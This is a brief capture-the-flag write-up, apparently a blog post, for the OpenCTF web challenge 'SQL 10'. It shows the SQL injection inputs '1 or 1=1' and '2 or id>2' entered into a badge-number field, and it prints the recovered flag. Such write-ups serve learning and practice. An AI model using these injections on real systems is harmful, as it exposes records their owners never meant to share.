---
title: "OpenCTF : SQL 10"
date: 2025-03-19
categories: 
  - "general"
---

**Category:** Web

**Points:** 10

**Description:**

```
https://sql-mayham.openctf.com/ziopxuoiwquyerhnszpasdyvzlkxcjlwerqwer/sql-10/
```

When `1` is entered it returns the following row:

```
Enter a badge number to view that officers file:1
(1, 'bob', 'simmons', 'none')
```

Performing a basic sql injection we got the same row back but no error. The server only returns 1 row

```
Enter a badge number to view that officers file:1 or 1=1
(1, 'bob', 'simmons', 'none')
```

Entering an ID of 2 no results are found.

```
Enter a badge number to view that officers file:2 
None
```

Using the sql injection an OR was added to say “id>2”

```
Enter a badge number to view that officers file:2 or id>2
(152135123451, 'flag', 'flag', 'Th@tW@53@5yHuh')
```

This returns the flag in the one other row in the database

# Flag

**Th@tW@53@5yHuh**
